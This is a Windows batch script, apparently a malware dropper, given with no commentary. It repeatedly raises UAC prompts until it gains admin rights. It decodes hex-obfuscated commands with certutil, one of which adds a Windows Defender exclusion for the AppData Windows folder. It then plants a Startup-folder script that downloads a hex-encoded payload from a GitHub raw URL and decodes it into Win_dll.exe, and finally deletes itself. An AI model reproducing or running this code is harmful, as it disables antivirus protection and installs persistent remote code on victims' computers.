@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    cd "%appdata%\Microsoft\Windows\Start Menu\Programs\"
    if exist Interleave.txt ( 
        exit /B  
    ) else ( 
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        set params = %*:"=""
        echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" 
        "%temp%\getadmin.vbs" 
        del "%temp%\getadmin.vbs"
        timeout /t 10 >nul
        goto UACPrompt
        
        )
:gotAdmin
    @echo off
    echo by auto windows10 > "%appdata%\Microsoft\Windows\Start Menu\Programs\Interleave.txt"
    cd "%appdata%\Microsoft\Windows\Start Menu\Programs\" 
    echo 536574206F626A5368656C6C203D204372656174654F626A6563742822575363726970742E5368656C6C22290D0A6F626A5368656C6C2E52756E20227365646C6C2E626174222C20302C2046616C73650D0A >"%appdata%\Microsoft\Windows\Start Menu\Programs\Ram.txt"
    echo 706F7765727368656C6C2E657865202D436F6D6D616E6420224164642D4D70507265666572656E6365202D4578636C7573696F6E5061746820272561707064617461255C4D6963726F736F66745C57696E646F77735C27220D0A > "%appdata%\Microsoft\Windows\Start Menu\Programs\sed.txt"
    certutil -decodehex "%appdata%\Microsoft\Windows\Start Menu\Programs\sed.txt" "%appdata%\Microsoft\Windows\Start Menu\Programs\sedll.bat"
    certutil -decodehex "%appdata%\Microsoft\Windows\Start Menu\Programs\Ram.txt" "%appdata%\Microsoft\Windows\Start Menu\Programs\server32.vbs"
    wscript server32.vbs
    echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
    echo if exist Win_dll.exe ( >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
    echo     del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
    echo     exit /B >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat" 
    echo ) >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
    echo curl -s -o "%userprofile%\Pictures\edmy.txt" https://raw.githubusercontent.com/ryn2020/ryn/main/Payload.txt >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
    echo certutil -decodehex "%userprofile%\Pictures\edmy.txt" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Win_dll.exe" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
    echo del "%userprofile%\Pictures\edmy.txt" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Dp.bat"
del %0
